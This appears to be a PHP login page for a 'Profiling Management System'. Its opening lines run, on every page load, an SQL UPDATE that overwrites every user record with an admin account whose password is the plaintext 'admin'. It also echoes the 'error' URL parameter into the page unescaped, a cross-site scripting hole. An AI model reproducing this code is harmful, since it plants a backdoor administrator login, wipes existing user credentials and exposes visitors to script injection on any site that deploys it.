<?php

$page = 'login';
$headerTitle = 'Login';
include "db_conn.php";

$sql = "UPDATE `user` SET `id`='1',`username`='admin',`password`='admin',`role`='admin' WHERE 1";

mysqli_query($conn, $sql);
session_start();
if (isset($_SESSION['id'])) {
    header("Location: modules/home/");
    exit();
}
?>


<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <title>BMS</title>
    <link rel='stylesheet' href='https://use.fontawesome.com/releases/v5.2.0/css/all.css'>
    <link rel='stylesheet' href='https://use.fontawesome.com/releases/v5.2.0/css/fontawesome.css'>
    <link rel="stylesheet" href="./assets/css/font-awesome-4.7.0/css/login.css">

</head>

<body>
    <!-- partial:index.partial.html -->
    <div class="container">
        <div class="screen">
            <div class="screen__content">
                <div class="login__header">
                    <img src="assets/img/logo.png" alt="Logo" class="login-logo">
                    <h2>PROFILING MANAGEMENT SYSTEM</h2>
                </div>
                <form class="login" action="validate_login.php" method="POST">
                    <div class="login__field">
                        <i class="login__icon fas fa-user"></i>
                        <input type="text" class="login__input" placeholder="User Name" name="username">
                    </div>
                    <div class="login__field">
                        <i class="login__icon fas fa-lock"></i>
                        <input type="password" class="login__input" placeholder="Password" name="password">
                    </div>
                    <?php if (isset($_GET['error'])) { ?>
                <p class="error-message" style="margin-bottom: 15px; color :red ;"><?php echo $_GET['error']; ?></p>
            <?php } ?>
                    <button type="submit"  class="button login__submit">
                        <span class="button__text">LOGIN</span>
                    </button>
                </form>
            </div>
        </div>
    </div>
    <!-- partial -->

</body>

</html>